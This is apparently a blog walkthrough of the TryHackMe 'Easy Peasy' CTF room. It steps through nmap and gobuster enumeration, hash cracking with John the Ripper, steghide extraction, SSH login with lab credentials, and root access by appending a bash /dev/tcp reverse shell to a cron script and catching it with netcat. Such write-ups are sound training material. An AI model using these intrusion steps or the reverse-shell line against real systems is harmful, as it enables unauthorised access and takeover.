---
title: "Challenges: Easy Peasy (TryHackMe)"
datePublished: Fri Jul 11 2025 21:00:00 GMT+0000 (Coordinated Universal Time)
cuid: cmd21unax000102l4anlh9xvm
slug: challenges-easy-peasy-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1752433707554/98eed7cc-95c9-4e1e-bb97-d819b086d574.png
tags: nmap, hashing, tryhackme, privilegeesclation, gobuster

---

In this task, we explore the fundamentals of enumeration, exploitation, and privilege escalation on a vulnerable machine. By leveraging tools like **Nmap**, **Gobuster**, **cURL**, **John the Ripper**, and **Steghide**, we methodically uncover hidden directories, decode encoded messages, crack hashes, and eventually gain both **user** and **root** access via **SSH** and a **reverse shell**. Each step reflects real-world techniques often used during Capture The Flag (CTF) challenges and penetration tests, helping reinforce offensive security concepts in practice.

We begin by scanning the machine to identify open ports and services, then enumerate directories to discover hidden content. From there, we crack encoded data and hashes to retrieve credentials, gain a shell on the target system, and escalate privileges to obtain both the **user** and **root** flags.

# Enumeration through Nmap

Deploy the machine attached to this task and use nmap to enumerate it.

`MACHINE_IP`

`nmap -p- -sC -sV IP_Address`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752350667301/1f27a260-a610-48c7-a776-007ea0148059.png align="center")

### Answer the questions below

1. How many ports are open?
    
2. What is the version of nginx?
    
3. What is running on the highest port? `Apache`
    

## Compromising the machine

Now you've enumerated the machine, answer questions and compromise it!

### Answer the questions below

1. Using GoBuster, find flag 1.
    
    `gobuster dir -u http://IP_Address -w /usr/share/wordlists/dirb/common.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752350825672/f86cf8eb-0002-4108-8413-b75d20ff5525.png align="center")
    
    `gobuster dir -u http://IP_Address/hidden/whatever/ -w /usr/share/wordlists/dirb/common.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752350928931/c74d1d5f-3f94-4cb9-b8e6-73a71649c122.png align="center")
    
    `curl http://IP_Address/hidden/whatever/index.html`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752351050172/3dc0d4ea-0f93-48ba-b3d1-3064c3245693.png align="center")
    
    using [base64decode](https://base64decode.org/)
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752351072422/60d6a628-1734-4677-bab1-318807a7294a.png align="center")
    
2. Further enumerate the machine, what is flag 2?
    
    checking the robots.txt reveals this:
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752351302925/2d2a7621-5398-4e3a-9866-dc24bb9b6f17.png align="center")
    
    `curl http://IP_Address:65524/robots.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752351372308/1a09a9eb-0bfa-46b3-8019-0c284bd2d2c7.png align="center")
    
    According to ChatGPT: this means **only** the bot with User-Agent `a18672860d0510e5ab6699730763b250` is allowed to crawl the site. That string is likely **a key** (possibly a flag, a hash, or an API token).
    
    Using Hashes.com:
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752351709675/bbc9ba5e-187c-4bc5-a50d-3f0ab11b168c.png align="center")
    
3. Crack the hash with easypeasy.txt, What is the flag 3?
    
    `curl http://IP_Address:65524/index.html` reveals the flag
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752352132101/09333794-8164-4b65-bbc2-e384fba4e97d.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752351812602/2dba4cba-1cd0-4c59-86b2-bb98769b21d1.png align="center")
    
4. What is the hidden directory?
    
    there’s this hint:
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752352258739/698fc924-c0ea-43dc-b197-8038a869c7a8.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752353299892/88f4f04e-d057-4783-8f81-c2b811ff8424.png align="center")
    
5. Using the wordlist that provided to you in this task crack the hash  
    what is the password?
    
    checking through the site on the hidden directory: `http://IP_Address:65524/n0th1ng3ls3m4tt3r/` inspect the page and even when you hover over the page or image this hash is shown
    
    copy the hash into a file:
    
    `echo "940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81" >> hash.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752353434536/9869dd3d-8306-4fd5-a324-296715a1c7aa.png align="center")
    
    we’ll use easypeasy.txt as provided as our wordlist
    
    `john --wordlist=easypeasy.txt --format=gost hash.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752353708657/71d84045-6530-4e09-bd2e-65aaf898b288.png align="center")
    
6. What is the password to login to the machine via SSH?
    
    there’s binary image within the hidden folder get the url and download it locally:
    
    `wget http://IP_Address:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg`
    
    use steghide to extract hidden files
    
    `steghide extract -sf image_name`
    
    `cat file_name.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752353794509/9ccb276c-5268-4288-93a8-853b76143e38.png align="center")
    
    the content of the file is binary, use CyberChef to decode:
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752354098312/4481bc05-0240-4861-a976-8190facbdc84.png align="center")
    
7. What is the user flag?
    
    in the previous step the file revealed the username which `boring` use ssh at port 6498 to get lower initial access.
    
    `ssh -p 6498 boring@IP_Address` password: `iconvertedmypasswordtobinary`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752354277526/328dd32e-edf6-45a7-af77-8f2c4d04674b.png align="center")
    
    in a way the user flag was encoded in ROT13 you’ll need to decode using cyberchef. I forgoot to capture the user flag but this is the final
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752354345238/34f88287-0241-4d43-adc9-7be731f89c2d.png align="center")
    
8. What is the root flag?  
    
    `find / -perm user.txt 2> /dev/null`  
      
    `echo "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" >> /var/www/.mysecretcronjob.sh`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752354518619/74342334-c546-4064-bed1-4471e930352d.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752354544866/68c1428e-db7f-4816-b349-bca670c648fb.png align="center")
    

  
On AttackBox run the listener:  
  
`nc -lvnp 4444`  
  
On the target machine run:  
  
`bash /var/www/.mysecretcronjob.sh`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752354577428/94708862-e796-4447-9cbb-0a8c6b9d1f20.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752354599252/b5a0a79f-09e8-4a00-bf94-5b24208e27d0.png align="center")

This challenge demonstrated the complete attack lifecycle—from initial enumeration to root-level access. Key takeaways include:

* Thorough port scanning with Nmap (`-p- -sC -sV`) helped reveal services running on standard and non-standard ports.
    
* Directory brute-forcing with Gobuster uncovered hidden paths critical to progressing.
    
* Using tools like **CyberChef**, **John the Ripper**, and **Steghide** was essential for decoding and uncovering hidden credentials or files.
    
* Analyzing web content like `robots.txt` or base64 strings helped uncover information often overlooked.
    
* Finally, combining SSH access and a crafted reverse shell enabled full system compromise and flag retrieval.
    

This task reinforces the importance of persistence, enumeration, and toolchain proficiency in real-world penetration testing and CTFs.